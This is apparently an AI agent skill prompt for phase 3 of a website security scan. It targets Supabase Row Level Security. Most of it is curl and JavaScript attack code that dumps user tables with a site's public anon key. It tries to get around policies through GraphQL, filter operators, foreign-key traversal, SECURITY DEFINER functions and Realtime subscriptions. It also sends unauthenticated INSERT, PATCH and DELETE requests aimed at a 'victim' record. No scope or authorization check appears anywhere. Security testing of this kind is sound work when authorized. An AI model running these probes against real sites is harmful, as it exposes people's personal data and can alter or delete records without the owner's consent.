---
name: scan-fase-3
description: Execute FASE 3 - RLS Testing. Tests Row Level Security policies on Supabase tables to identify data exposure vulnerabilities. Tests common tables, filter bypasses, and GraphQL RLS bypass techniques. Adapts to discovered schema from FASE 2. Invoke with /scan-fase-3 {url}.
---

# FASE 3: RLS Testing (Tabelas)

Deep RLS (Row Level Security) testing phase. Tests whether tables are properly protected and attempts various bypass techniques to expose data.

## Core Principle

**TEST EVERY TABLE FOR DATA EXPOSURE**

The checklist items (3.1-3.6) are MINIMUM requirements. The agent MUST:
- Test ALL tables discovered in FASE 2, not just common names
- Try multiple bypass techniques on each table
- Adapt filter bypass attempts based on discovered field types
- Document exactly what data is exposed (field names, record counts)

**CRITICAL: Use schema from FASE 2 to guide testing.**

## Invocation

```
/scan-fase-3 {url}
```

**Requires:** FASE 0 + FASE 1 completed (configs extracted), FASE 2 completed (schema discovered)

## Output

Structured results for the scan-write skill:

```yaml
FASE_3_RESULTS:
  target_url: {url}
  supabase_url: {from FASE 1}
  anon_key: {from FASE 1}
  scan_timestamp: "{ISO 8601}"
  status: "{completed|partial|blocked}"
  status_reason: "{if partial/blocked, explain why}"

  tables_tested:
    - name: {table_name}
      rls_enabled: {yes|no|unknown}
      accessible: {yes|no|partial}
      records_exposed: {number or "all" or "none"}
      fields_exposed: [list of field names]
      bypass_method: {none|direct|filter|graphql|relationship|function|write|realtime}
      proof_of_concept: {curl command that worked}

  vulnerabilities_found:
    - id: "VULN-3-{seq}"
      table: {table_name}
      type: {rls_disabled|rls_bypass|filter_bypass|graphql_bypass|relationship_bypass|write_rls_missing|function_bypass|realtime_bypass|count_disclosure|view_bypass}
      severity: {critical|high|medium|low}
      records_exposed: {count}
      fields_exposed: [list]
      poc_command: {curl command}
      poc_response: {sample response}

  secure_findings:
    - test: "{table_name} RLS"
      result: "SECURE"
      evidence: "{e.g., Returns empty array for anon}"

  tests_skipped:
    - test: "{test name}"
      reason: "{why skipped}"
      recommendation: "{how to enable}"

  write_operation_tests:
    - table: {table_name}
      operation: {INSERT|UPDATE|DELETE}
      result: {allowed|blocked|info_disclosure}
      response_code: {HTTP code}
      data_leaked: {yes|no}

  function_tests:
    - function_name: {name}
      accessible: {yes|no}
      bypasses_rls: {yes|no|unknown}
      data_returned: {description}

  relationship_tests:
    - source_table: {table_name}
      target_table: {related_table}
      traversal_query: {select pattern}
      result: {data_leaked|blocked}

  count_disclosure:
    - table: {table_name}
      count_exposed: {yes|no}
      total_records: {number if exposed}
      method: {Content-Range|aggregate|error_message}

  bypass_attempts:
    - table: {table_name}
      technique: {technique_name}
      payload: {filter or query used}
      result: {success|blocked|error}
      response_code: {HTTP code}

  additional_findings: [anything else discovered]
```

---

## Execution Methodology

### Phase 3.1: Test Common User Tables via REST

**Test tables with user data:**

```bash
# profiles
curl -s "https://{project}.supabase.co/rest/v1/profiles?select=*" \
  -H "apikey: {anon_key}" \
  -H "Authorization: Bearer {anon_key}"

# users
curl -s "https://{project}.supabase.co/rest/v1/users?select=*" \
  -H "apikey: {anon_key}"

# accounts
curl -s "https://{project}.supabase.co/rest/v1/accounts?select=*" \
  -H "apikey: {anon_key}"

# members
curl -s "https://{project}.supabase.co/rest/v1/members?select=*" \
  -H "apikey: {anon_key}"

# customers
curl -s "https://{project}.supabase.co/rest/v1/customers?select=*" \
  -H "apikey: {anon_key}"
```

**Analyze response:**
- `200` with data → RLS DISABLED or policy allows anon access (CRITICAL)
- `200` with `[]` → RLS enabled and blocking (SECURE)
- `401` → Authentication required
- `404` → Table doesn't exist

### Phase 3.2: Test Data Tables via REST

**Test tables with business data:**

```bash
# posts
curl -s "https://{project}.supabase.co/rest/v1/posts?select=*" \
  -H "apikey: {anon_key}"

# comments
curl -s "https://{project}.supabase.co/rest/v1/comments?select=*" \
  -H "apikey: {anon_key}"

# messages
curl -s "https://{project}.supabase.co/rest/v1/messages?select=*" \
  -H "apikey: {anon_key}"

# orders
curl -s "https://{project}.supabase.co/rest/v1/orders?select=*" \
  -H "apikey: {anon_key}"

# payments
curl -s "https://{project}.supabase.co/rest/v1/payments?select=*" \
  -H "apikey: {anon_key}"

# subscriptions
curl -s "https://{project}.supabase.co/rest/v1/subscriptions?select=*" \
  -H "apikey: {anon_key}"
```

### Phase 3.3: Test Form Tables via REST

**Test tables with form/submission data:**

```bash
# forms
curl -s "https://{project}.supabase.co/rest/v1/forms?select=*" \
  -H "apikey: {anon_key}"

# form_responses
curl -s "https://{project}.supabase.co/rest/v1/form_responses?select=*" \
  -H "apikey: {anon_key}"

# form_fields
curl -s "https://{project}.supabase.co/rest/v1/form_fields?select=*" \
  -H "apikey: {anon_key}"

# submissions
curl -s "https://{project}.supabase.co/rest/v1/submissions?select=*" \
  -H "apikey: {anon_key}"
```

### Phase 3.4: Test File Tables via REST

**Test tables with file/document references:**

```bash
# files
curl -s "https://{project}.supabase.co/rest/v1/files?select=*" \
  -H "apikey: {anon_key}"

# documents
curl -s "https://{project}.supabase.co/rest/v1/documents?select=*" \
  -H "apikey: {anon_key}"

# uploads
curl -s "https://{project}.supabase.co/rest/v1/uploads?select=*" \
  -H "apikey: {anon_key}"

# attachments
curl -s "https://{project}.supabase.co/rest/v1/attachments?select=*" \
  -H "apikey: {anon_key}"
```

### Phase 3.5: GraphQL RLS Bypass

**Test RLS bypass via GraphQL API:**

```bash
# GraphQL query to bypass RLS
curl -s -X POST "https://{project}.supabase.co/graphql/v1" \
  -H "apikey: {anon_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ profilesCollection(first: 20) { edges { node { id email } } } }"
  }'
```

**Test each discovered table via GraphQL:**

```graphql
# Pattern: {tableName}Collection(first: N) { edges { node { ...fields } } }

{ usersCollection(first: 20) { edges { node { id email name } } } }
{ ordersCollection(first: 20) { edges { node { id user_id amount status } } } }
{ messagesCollection(first: 20) { edges { node { id sender_id content } } } }
```

**Compare REST vs GraphQL results:**
- If REST returns `[]` but GraphQL returns data → GraphQL RLS bypass vulnerability

### Phase 3.6: Filter Bypass Techniques

**Test filter-based RLS bypasses:**

```bash
# Bypass 1: neq.null (not equal to null)
curl -s "https://{project}.supabase.co/rest/v1/profiles?id=neq.null" \
  -H "apikey: {anon_key}"

# Bypass 2: or filter
curl -s "https://{project}.supabase.co/rest/v1/profiles?or=(id.neq.null)" \
  -H "apikey: {anon_key}"

# Bypass 3: ilike wildcard on email
curl -s "https://{project}.supabase.co/rest/v1/profiles?email=ilike.%25%40%25" \
  -H "apikey: {anon_key}"

# Bypass 4: Select all with limit
curl -s "https://{project}.supabase.co/rest/v1/profiles?select=*&limit=100" \
  -H "apikey: {anon_key}"

# Bypass 5: Order by to force evaluation
curl -s "https://{project}.supabase.co/rest/v1/profiles?order=id.asc" \
  -H "apikey: {anon_key}"
```

### Phase 3.7: Write Operation RLS Testing

**Test INSERT/UPDATE/DELETE - often missing RLS policies:**

```bash
# Test INSERT without auth (may reveal field requirements)
curl -X POST "https://{project}.supabase.co/rest/v1/{table}" \
  -H "apikey: {anon_key}" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"email":"test@securedev.test"}'

# Test INSERT with conflict detection (reveals existing records)
curl -X POST "https://{project}.supabase.co/rest/v1/profiles" \
  -H "apikey: {anon_key}" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation,resolution=ignore-duplicates" \
  -d '{"email":"target@example.com"}'
# 409 Conflict = email exists (information disclosure)

# Test UPDATE with RETURNING (may exfiltrate data through response)
curl -X PATCH "https://{project}.supabase.co/rest/v1/profiles?id=eq.{guessed_uuid}" \
  -H "apikey: {anon_key}" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"updated_at":"2024-01-01T00:00:00Z"}'

# Test DELETE enumeration
curl -X DELETE "https://{project}.supabase.co/rest/v1/profiles?email=eq.test@test.com" \
  -H "apikey: {anon_key}" \
  -H "Prefer: return=representation"
```

**Analyze response:**
- `201` with data → INSERT allowed without auth (CRITICAL)
- `200` with data on PATCH/DELETE → Write RLS missing (CRITICAL)
- `409` Conflict → Reveals record existence (MEDIUM)
- `403` or RLS error → Properly protected

### Phase 3.8: Relationship/FK Traversal Bypass

**Access protected data through poorly secured related tables:**

```bash
# If 'profiles' is protected but 'orders' is not, leak profile data through relation
curl -s "https://{project}.supabase.co/rest/v1/orders?select=*,user:user_id(*)" \
  -H "apikey: {anon_key}"

# Reverse traversal - access parent through child
curl -s "https://{project}.supabase.co/rest/v1/comments?select=*,author:user_id(id,email,name)" \
  -H "apikey: {anon_key}"

# Multi-hop traversal through relationships
curl -s "https://{project}.supabase.co/rest/v1/orders?select=*,user:user_id(*,organization:org_id(*,billing:billing_id(*)))" \
  -H "apikey: {anon_key}"

# Access through explicit FK constraint name
curl -s "https://{project}.supabase.co/rest/v1/orders?select=*,profiles!orders_user_id_fkey(*)" \
  -H "apikey: {anon_key}"
```

**Test ALL discovered relationships in BOTH directions.**

### Phase 3.9: VIEW and Materialized View Testing

**Views may not inherit RLS from underlying tables:**

```bash
# Common view naming patterns
curl -s "https://{project}.supabase.co/rest/v1/v_all_users?select=*" \
  -H "apikey: {anon_key}"

curl -s "https://{project}.supabase.co/rest/v1/user_summary?select=*" \
  -H "apikey: {anon_key}"

curl -s "https://{project}.supabase.co/rest/v1/vw_profiles?select=*" \
  -H "apikey: {anon_key}"

# Materialized views (often for analytics - may expose aggregated PII)
curl -s "https://{project}.supabase.co/rest/v1/mv_user_stats?select=*" \
  -H "apikey: {anon_key}"

curl -s "https://{project}.supabase.co/rest/v1/mv_analytics?select=*" \
  -H "apikey: {anon_key}"

# Report views
curl -s "https://{project}.supabase.co/rest/v1/daily_report?select=*" \
  -H "apikey: {anon_key}"
```

**Views created with SECURITY INVOKER (default) or without explicit RLS can bypass table-level policies.**

### Phase 3.10: SECURITY DEFINER Function Bypass

**Functions with SECURITY DEFINER execute as the function owner (often superuser), completely bypassing RLS:**

```bash
# Enumerate all RPC functions via OpenAPI
curl -s "https://{project}.supabase.co/rest/v1/" \
  -H "apikey: {anon_key}" | grep -o '"\/rpc\/[^"]*"' | tr -d '"'

# Test common dangerous function patterns
for func in get_all_users search_users list_users export_data admin_report \
            get_user_by_email find_user bulk_export sync_all get_stats; do
  curl -s -X POST "https://{project}.supabase.co/rest/v1/rpc/${func}" \
    -H "apikey: {anon_key}" \
    -H "Content-Type: application/json" \
    -d '{}'
  echo " <- ${func}"
done

# Test with parameters (may bypass user_id checks)
curl -X POST "https://{project}.supabase.co/rest/v1/rpc/get_user_data" \
  -H "apikey: {anon_key}" \
  -H "Content-Type: application/json" \
  -d '{"target_user_id": "victim-uuid-here"}'

# Test search functions (often return all matching records)
curl -X POST "https://{project}.supabase.co/rest/v1/rpc/search_users" \
  -H "apikey: {anon_key}" \
  -H "Content-Type: application/json" \
  -d '{"query": "%"}'
```

**If function returns data that direct table access blocks → SECURITY DEFINER bypass (CRITICAL)**

### Phase 3.11: Count Enumeration Testing

**Even when data is protected, record counts can be exposed:**

```bash
# Check if count is exposed via Content-Range header
curl -I "https://{project}.supabase.co/rest/v1/{table}?select=id" \
  -H "apikey: {anon_key}" \
  -H "Prefer: count=exact"
# Look for: Content-Range: 0-0/1547 (reveals total count)

# Check via HEAD request with range
curl -I "https://{project}.supabase.co/rest/v1/{table}" \
  -H "apikey: {anon_key}" \
  -H "Range-Unit: items" \
  -H "Range: 0-0" \
  -H "Prefer: count=exact"

# Aggregate count query
curl -s "https://{project}.supabase.co/rest/v1/{table}?select=count" \
  -H "apikey: {anon_key}"
```

**Document in output:**
```yaml
count_disclosure:
  table: profiles
  count_exposed: yes
  total_records: 1547
  method: Content-Range header
```

### Phase 3.12: Advanced Filter Operator Chaining

**Complex filter combinations can confuse RLS policy evaluation:**

```bash
# Combine multiple operators
curl -s "https://{project}.supabase.co/rest/v1/profiles?or=(and(id.neq.null,status.eq.active),created_at.gt.2020-01-01)" \
  -H "apikey: {anon_key}"

# Negation chaining
curl -s "https://{project}.supabase.co/rest/v1/profiles?not.and=(user_id.eq.{attacker_id},deleted.eq.true)" \
  -H "apikey: {anon_key}"

# JSON/JSONB field access (often not covered in RLS policies)
curl -s "https://{project}.supabase.co/rest/v1/profiles?metadata->>email=ilike.%25%40%25" \
  -H "apikey: {anon_key}"

curl -s "https://{project}.supabase.co/rest/v1/users?settings->>role=eq.admin" \
  -H "apikey: {anon_key}"

# Full-text search bypass (if enabled)
curl -s "https://{project}.supabase.co/rest/v1/profiles?fts=english.test" \
  -H "apikey: {anon_key}"

# Array contains operator
curl -s "https://{project}.supabase.co/rest/v1/profiles?roles=cs.{admin}" \
  -H "apikey: {anon_key}"
```

### Phase 3.13: WebSocket/Realtime Protocol-Level RLS Testing

**Realtime subscriptions may have different RLS than REST API:**

```bash
# Test via WebSocket connection
wscat -c "wss://{project}.supabase.co/realtime/v1/websocket?apikey={anon_key}&vsn=1.0.0"
```

```javascript
// Send join message for wildcard table subscription
{
  "topic": "realtime:public:profiles",
  "event": "phx_join",
  "payload": {
    "config": {
      "broadcast": { "self": true },
      "postgres_changes": [{
        "event": "*",
        "schema": "public",
        "table": "profiles",
        "filter": ""  // No filter = potential RLS bypass
      }]
    }
  },
  "ref": "1"
}

// Try wildcard table subscription
{
  "topic": "realtime:public:*",
  "event": "phx_join",
  "payload": { "config": { "postgres_changes": [{ "event": "*", "schema": "public", "table": "*" }] }},
  "ref": "2"
}
```

**If Realtime returns data that REST blocks → Realtime RLS bypass (CRITICAL)**

### Phase 3.14: GraphQL Directive and Authorization Analysis

**Custom directives reveal authorization logic:**

```graphql
# Extract all directives
{
  __schema {
    directives {
      name
      description
      locations
      args { name type { name } }
    }
  }
}

# Query type introspection for policy hints in descriptions
{
  __type(name: "profiles") {
    fields {
      name
      description
      args {
        name
        defaultValue
      }
    }
  }
}
```

**Look for directives like `@auth`, `@requireAuth`, `@hasPermission`, `@owner` - they reveal authorization logic.**

---

## Adaptive Testing Rules

**The agent MUST also test:**

1. **All tables from FASE 2** - Not just the common names listed above
2. **Tables with discovered relationships** - If `orders` has `user_id`, test both
3. **Hidden tables** - Tables that returned 401/403 in FASE 2 (may need different approach)
4. **Custom table names** - Vibe-coded apps often have unique table names

### Test Tables from FASE 2 Schema

```javascript
// For each table discovered in FASE 2
for (const table of fase2_tables) {
  // Direct access test
  const directResponse = await fetch(
    `${supabaseUrl}/rest/v1/${table.name}?select=*`,
    { headers: { 'apikey': anonKey } }
  );

  // GraphQL access test
  const graphqlResponse = await fetch(
    `${supabaseUrl}/graphql/v1`,
    {
      method: 'POST',
      headers: {
        'apikey': anonKey,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        query: `{ ${table.name}Collection(first: 10) { edges { node { ${table.fields.map(f => f.name).join(' ')} } } } }`
      })
    }
  );

  // Filter bypass tests using discovered field names
  for (const field of table.fields) {
    if (field.type === 'uuid') {
      await testFilter(table.name, `${field.name}=neq.null`);
    }
    if (field.type === 'text' || field.type === 'varchar') {
      await testFilter(table.name, `${field.name}=ilike.%25%25`);
    }
  }
}
```

---

## Unknown Discovery Heuristics

**When testing reveals unexpected behavior:**

### Heuristic 1: Partial Data Exposure

When some records are returned but not all:

```javascript
// RLS may be filtering by a field - try to identify the pattern
async function analyzePartialExposure(table, response) {
  if (response.length > 0 && response.length < expectedTotal) {
    // Check common filtering patterns
    const exposedIds = response.map(r => r.id);
    const exposedUserIds = response.map(r => r.user_id).filter(Boolean);

    return {
      pattern: 'partial_exposure',
      exposed_count: response.length,
      possible_filter: exposedUserIds.length > 0 ? 'user_id based' : 'unknown',
      sample_ids: exposedIds.slice(0, 5)
    };
  }
}
```

### Heuristic 2: Field-Level RLS

When some fields are hidden but table is accessible:

```javascript
// Compare requested fields vs returned fields
async function detectFieldLevelRLS(table, requestedFields, response) {
  if (response.length > 0) {
    const returnedFields = Object.keys(response[0]);
    const hiddenFields = requestedFields.filter(f => !returnedFields.includes(f));

    if (hiddenFields.length > 0) {
      return {
        pattern: 'field_level_rls',
        visible_fields: returnedFields,
        hidden_fields: hiddenFields
      };
    }
  }
}
```

### Heuristic 3: Conditional RLS

When behavior changes based on query parameters:

```javascript
// Test if RLS policy depends on specific conditions
async function detectConditionalRLS(table) {
  const tests = [
    { filter: '', name: 'no_filter' },
    { filter: '?limit=1', name: 'with_limit' },
    { filter: '?order=id.asc', name: 'with_order' },
    { filter: '?select=id', name: 'select_id_only' },
  ];

  const results = [];
  for (const test of tests) {
    const response = await fetch(`${url}/${table}${test.filter}`);
    results.push({
      test: test.name,
      status: response.status,
      count: (await response.json()).length
    });
  }

  // If results differ, RLS has conditional behavior
  return results;
}
```

### Heuristic 4: RLS Policy Error Messages

Parse errors that reveal RLS policy details:

```javascript
function parseRLSError(errorMessage) {
  // "new row violates row-level security policy for table X"
  if (errorMessage.includes('row-level security policy')) {
    return { rls_enabled: true, operation_blocked: true };
  }

  // "permission denied for table X"
  if (errorMessage.includes('permission denied')) {
    return { rls_enabled: true, table_protected: true };
  }

  // Policy name sometimes revealed
  const policyMatch = errorMessage.match(/policy "(\w+)"/);
  if (policyMatch) {
    return { rls_enabled: true, policy_name: policyMatch[1] };
  }

  return null;
}
```

### Heuristic 5: Unexpected Field Discovery

When response contains fields not in schema:

```javascript
// Discover hidden/undocumented fields
async function discoverUnexpectedFields(table, knownFields, response) {
  if (response.length > 0) {
    const returnedFields = Object.keys(response[0]);
    const unexpectedFields = returnedFields.filter(f => !knownFields.includes(f));

    if (unexpectedFields.length > 0) {
      // These fields weren't in schema - may contain sensitive data
      // Analyze their content for PII patterns
      const sensitivePatterns = {
        email: /@.*\./,
        phone: /^\+?[\d\s-]{10,}/,
        ssn: /^\d{3}-\d{2}-\d{4}$/,
        credit_card: /^\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}$/,
        api_key: /^(sk_|pk_|api_|key_)/i,
        password_hash: /^\$2[aby]?\$/,
      };

      for (const field of unexpectedFields) {
        const value = String(response[0][field]);
        for (const [type, pattern] of Object.entries(sensitivePatterns)) {
          if (pattern.test(value)) {
            return { field, sensitive_type: type, sample: value.slice(0, 20) };
          }
        }
      }

      return { pattern: 'undocumented_fields', fields: unexpectedFields };
    }
  }
}
```

### Heuristic 6: Behavior Differential Analysis

Compare responses across different access methods to find inconsistencies:

```javascript
// Find RLS inconsistencies between access methods
async function analyzeBehaviorDifferential(table, supabaseUrl, anonKey) {
  const methods = {
    rest_direct: await fetch(`${supabaseUrl}/rest/v1/${table}?select=*`),
    rest_filtered: await fetch(`${supabaseUrl}/rest/v1/${table}?id=neq.null`),
    graphql: await fetchGraphQL(table),
    rest_with_order: await fetch(`${supabaseUrl}/rest/v1/${table}?order=id.asc`),
    rest_with_limit: await fetch(`${supabaseUrl}/rest/v1/${table}?limit=1000`),
  };

  const results = {};
  for (const [method, response] of Object.entries(methods)) {
    const data = await response.json();
    results[method] = {
      status: response.status,
      count: Array.isArray(data) ? data.length : 0,
      fields: Array.isArray(data) && data[0] ? Object.keys(data[0]) : []
    };
  }

  // Find inconsistencies - if any method returns more data, it's a bypass
  const maxCount = Math.max(...Object.values(results).map(r => r.count));
  const bypasses = Object.entries(results)
    .filter(([_, r]) => r.count === maxCount && maxCount > 0)
    .map(([method, _]) => method);

  if (bypasses.length > 0 && bypasses.length < Object.keys(methods).length) {
    return { pattern: 'differential_bypass', methods_that_work: bypasses };
  }
}
```

### Heuristic 7: Dynamic Relationship Discovery

Discover relationships not in schema by testing common FK patterns:

```javascript
// Try to discover relationships dynamically
async function discoverRelationships(table, supabaseUrl, anonKey) {
  const discoveredRelations = [];

  // Common FK naming patterns
  const fkPatterns = [
    'user_id', 'author_id', 'owner_id', 'created_by', 'updated_by',
    'parent_id', 'org_id', 'organization_id', 'team_id', 'company_id',
    'category_id', 'type_id', 'status_id', 'project_id', 'account_id'
  ];

  // Common related table names
  const relatedTables = [
    'users', 'profiles', 'accounts', 'organizations', 'teams',
    'categories', 'types', 'statuses', 'projects', 'companies'
  ];

  // Try embedded resource queries
  for (const relatedTable of relatedTables) {
    const response = await fetch(
      `${supabaseUrl}/rest/v1/${table}?select=*,${relatedTable}(*)`,
      { headers: { 'apikey': anonKey } }
    );

    if (response.ok) {
      const data = await response.json();
      if (data.length > 0 && data[0][relatedTable]) {
        discoveredRelations.push({
          from: table,
          to: relatedTable,
          data_exposed: Object.keys(data[0][relatedTable])
        });
      }
    }
  }

  return discoveredRelations;
}
```

### Heuristic 8: RLS Policy Reverse Engineering

Infer RLS policy logic from response patterns:

```javascript
// Reverse engineer RLS policy from behavior
async function reverseEngineerPolicy(table, supabaseUrl, anonKey, testJwt) {
  const policy = {
    select: { anon: 'unknown', authenticated: 'unknown', condition: null },
    insert: { anon: 'unknown', authenticated: 'unknown' },
    update: { anon: 'unknown', authenticated: 'unknown' },
    delete: { anon: 'unknown', authenticated: 'unknown' }
  };

  // Test SELECT with anon
  const anonSelect = await fetch(`${supabaseUrl}/rest/v1/${table}?select=*`, {
    headers: { 'apikey': anonKey }
  });
  const anonData = await anonSelect.json();

  if (anonSelect.status === 200 && anonData.length > 0) {
    policy.select.anon = 'allowed';

    // Analyze what's exposed to infer policy
    // If all records have same user_id - policy might be "where user_id = {some_default}"
    // If varied user_ids - policy is truly open
    const userIds = [...new Set(anonData.map(r => r.user_id).filter(Boolean))];
    if (userIds.length === 1) {
      policy.select.condition = `user_id = '${userIds[0]}' (fixed value?)`;
    } else if (userIds.length > 1) {
      policy.select.condition = 'USING (true) - fully open';
    }
  } else if (anonSelect.status === 200 && anonData.length === 0) {
    policy.select.anon = 'blocked_by_rls';
  }

  // Test with JWT if available
  if (testJwt) {
    const authSelect = await fetch(`${supabaseUrl}/rest/v1/${table}?select=*`, {
      headers: { 'apikey': anonKey, 'Authorization': `Bearer ${testJwt}` }
    });
    const authData = await authSelect.json();

    if (authData.length > anonData.length) {
      policy.select.authenticated = 'more_permissive';

      // Check if it's user-filtered or fully open
      if (authData.length > 100) {
        policy.select.condition = 'Possibly auth.role() = authenticated (reads all)';
      }
    }
  }

  return policy;
}
```

### Heuristic 9: Unknown Vulnerability Pattern Detection

When something unexpected happens, document and adapt:

```javascript
// Handle and document unexpected discoveries
function handleUnexpectedDiscovery(context) {
  const { table, method, expected, actual, response } = context;

  const discovery = {
    timestamp: new Date().toISOString(),
    table,
    method,
    expected_behavior: expected,
    actual_behavior: actual,
    raw_response: JSON.stringify(response).slice(0, 500),
    classification: 'unknown',
    recommended_action: 'investigate_further'
  };

  // Try to classify the unexpected behavior
  if (actual.includes('data exposed') && expected.includes('blocked')) {
    discovery.classification = 'potential_bypass';
    discovery.recommended_action = 'document_as_vulnerability';
  }

  if (actual.includes('error') && response.message) {
    // Errors might reveal info
    if (response.message.includes('column') || response.message.includes('table')) {
      discovery.classification = 'information_disclosure_via_error';
    }
  }

  if (actual.includes('different_count')) {
    discovery.classification = 'rls_inconsistency';
    discovery.recommended_action = 'compare_access_methods';
  }

  return discovery;
}
```

### Heuristic 10: Adaptive Bypass Generation

Generate new bypass attempts based on discovered patterns:

```javascript
// Generate adaptive bypass attempts based on what we learn
function generateAdaptiveBypassAttempts(table, discoveredFields, discoveredTypes) {
  const attempts = [];

  // For each discovered field, generate type-appropriate bypass
  for (const field of discoveredFields) {
    const fieldType = discoveredTypes[field] || 'unknown';

    if (fieldType === 'uuid' || field.endsWith('_id')) {
      attempts.push(`?${field}=neq.null`);
      attempts.push(`?or=(${field}.neq.null)`);
    }

    if (fieldType === 'text' || fieldType === 'varchar' || fieldType === 'unknown') {
      attempts.push(`?${field}=ilike.%25%25`);
      attempts.push(`?${field}=not.is.null`);
    }

    if (fieldType === 'boolean') {
      attempts.push(`?${field}=eq.true`);
      attempts.push(`?${field}=eq.false`);
      attempts.push(`?or=(${field}.eq.true,${field}.eq.false)`);
    }

    if (fieldType === 'timestamp' || field.includes('_at') || field.includes('date')) {
      attempts.push(`?${field}=gt.1970-01-01`);
      attempts.push(`?${field}=lt.2099-12-31`);
    }

    if (fieldType === 'jsonb' || fieldType === 'json') {
      attempts.push(`?${field}->>id=neq.null`);
      attempts.push(`?${field}->>'email'=ilike.%25%40%25`);
    }

    if (fieldType === 'integer' || fieldType === 'bigint') {
      attempts.push(`?${field}=gte.0`);
      attempts.push(`?${field}=neq.-999999`);
    }
  }

  // Add relationship attempts if we found FK patterns
  const fkFields = discoveredFields.filter(f => f.endsWith('_id'));
  for (const fk of fkFields) {
    const relatedTable = fk.replace('_id', 's'); // user_id -> users
    attempts.push(`?select=*,${relatedTable}(*)`);
    attempts.push(`?select=*,${fk.replace('_id', '')}:${fk}(*)`);
  }

  return attempts;
}
```

---

## Core Principle: Adapt and Document

**The agent MUST:**

1. **Never assume the patterns are complete** - Always look for unexpected behavior
2. **Document everything unusual** - Even if not immediately exploitable
3. **Generate new tests based on discoveries** - Use heuristics 9 and 10
4. **Compare access methods** - Use heuristic 6 to find differential bypasses
5. **Infer relationships** - Use heuristic 7 when schema is incomplete
6. **Reverse engineer policies** - Use heuristic 8 to understand what's being enforced

**When something unexpected happens:**

```yaml
unexpected_discovery:
  table: {table}
  expected: "RLS should block anonymous access"
  actual: "Returned 47 records with filter ?metadata->>type=eq.public"
  classification: potential_bypass
  follow_up_tests:
    - Test same filter on other tables
    - Test other JSONB field accesses
    - Document as new bypass technique
```

### Decision Tree for RLS Testing

```
Test table for RLS?
│
├─ Direct REST access (?select=*)
│   ├─ Returns data → RLS DISABLED or misconfigured (VULNERABLE)
│   ├─ Returns [] → RLS enabled, try bypass techniques
│   ├─ Returns 401 → Requires auth (test with JWT below)
│   └─ Returns 404 → Table not exposed via REST
│
├─ If 401 (auth required), test with valid JWT token
│   ├─ Returns ALL data → Insufficient policy (CRITICAL - any auth user reads all)
│   ├─ Returns only own data → Proper user_id filtering (SECURE)
│   ├─ Returns partial data → Investigate policy conditions
│   └─ Still blocked → Role-based restriction (test with different roles)
│
├─ If REST blocked, try GraphQL
│   ├─ Returns data → GraphQL RLS bypass (VULNERABLE)
│   └─ Returns error → GraphQL also protected
│
├─ If both blocked, try filter bypasses
│   ├─ ?id=neq.null
│   ├─ ?or=(id.neq.null)
│   ├─ ?{field}=ilike.%25%25
│   └─ Any returns data → Filter bypass (VULNERABLE)
│
├─ Try relationship traversal
│   ├─ ?select=*,related_table(*)
│   └─ Returns protected data → FK traversal bypass (VULNERABLE)
│
├─ Try write operations (INSERT/UPDATE/DELETE)
│   ├─ 201/200 with data → Write RLS missing (CRITICAL)
│   ├─ 409 Conflict → Information disclosure (MEDIUM)
│   └─ 403/RLS error → Properly protected
│
├─ Try RPC functions
│   ├─ Returns data blocked by table access → SECURITY DEFINER bypass (CRITICAL)
│   └─ Same restrictions → Functions properly secured
│
├─ Check count disclosure
│   ├─ Content-Range reveals count → Count disclosure (LOW/MEDIUM)
│   └─ No count exposed → Properly hidden
│
└─ Document results
    ├─ Vulnerable → Record POC, count exposed records, method used
    └─ Secure → Note as tested with all techniques
```

---

## Proof of Concept Documentation

**For each vulnerability found, document:**

```yaml
vulnerability:
  table: profiles
  type: rls_disabled
  severity: critical

  poc_command: |
    curl -s "https://abc123.supabase.co/rest/v1/profiles?select=*" \
      -H "apikey: eyJ..."

  poc_response: |
    [
      {"id": "uuid-1", "email": "user1@example.com", "name": "John"},
      {"id": "uuid-2", "email": "user2@example.com", "name": "Jane"},
      ...
    ]

  records_exposed: 1547
  fields_exposed: [id, email, name, phone, address, created_at]

  reproduction_steps:
    1. Navigate to Supabase REST API
    2. Use anon key from JS bundle
    3. Query profiles table with select=*
    4. All user data is returned without authentication
```

---

## Error Handling

**If no tables are accessible:**
```yaml
FASE_3_RESULTS:
  status: completed
  note: "All tested tables are properly protected by RLS"
  tables_tested: [list]
  vulnerabilities_found: []
  recommendation: "Continue to FASE 4"
```

**If FASE 2 schema is not available:**
```yaml
FASE_3_RESULTS:
  status: partial
  note: "No schema from FASE 2 - testing common table names only"
  tables_tested: [common tables from checklist]
```

---

## References

- `references/rls-bypass-techniques.md` - Additional bypass techniques
- FASE 2 results - Discovered tables and fields
- FASE 1 results - Supabase URL and anon key

---

## After Completion

After executing FASE 3, provide the YAML results and call `/scan-write`:

```
/scan-write {client_name} --fase 3
```

This logs the RLS testing results to SCAN-IN-PROGRESS.md.
